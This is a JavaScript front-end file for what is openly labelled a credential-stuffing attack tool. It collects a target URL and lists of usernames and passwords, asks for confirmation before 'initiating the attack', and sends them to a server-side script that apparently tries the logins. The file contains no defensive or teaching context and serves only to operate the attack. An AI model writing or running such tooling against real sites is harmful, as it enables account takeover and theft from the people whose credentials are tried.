document.addEventListener('DOMContentLoaded', function() {
  const credentialForm = document.getElementById('credential-stuffing-form');
  if (credentialForm) {
    credentialForm.addEventListener('submit', function(event) {
      event.preventDefault();

      const targetUrl = document.getElementById('target-url').value;
      const usernameList = document.getElementById('username-list').value;
      const passwordList = document.getElementById('password-list').value;

      if (!targetUrl || !usernameList || !passwordList) {
        alert('Please fill in all fields.');
        return;
      }

      const usernames = usernameList.split('\n').filter(Boolean);
      const passwords = passwordList.split('\n').filter(Boolean);

      if (usernames.length === 0 || passwords.length === 0) {
        alert('Username and password lists cannot be empty.');
        return;
      }

      try {
          new URL(targetUrl);
      } catch (_) {
          alert('Invalid target URL.');
          return;
      }

      // Consider adding a confirmation before initiating the attack
      if (!confirm("Are you sure you want to initiate the credential stuffing attack?")) {
        return;
      }

      const payload = {
        targetUrl: targetUrl,
        usernames: usernames,
        passwords: passwords
      };

      fetch('/main/credential-stuffing/stuff.php', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
      })
      .then(response => {
        if (!response.ok) {
          // Log the error on the server for better debugging. Consider sending a different status code.
          console.error(`Server error: ${response.status} - ${response.statusText}`);
          throw new Error(`HTTP error! status: ${response.status}`);
        }
        return response.json();
      })
      .then(data => {
        // Display a more informative message to the user.
        if (data.success) {
          alert(data.message || 'Credential stuffing attack initiated successfully.');
        } else {
          alert(data.message || 'Credential stuffing attack failed.');
        }
      })
      .catch(error => {
        console.error('Error:', error);
        alert('Failed to initiate credential stuffing attack: ' + error.message);
      });
    });
  } else {
    console.error('Credential stuffing form not found.');
  }
});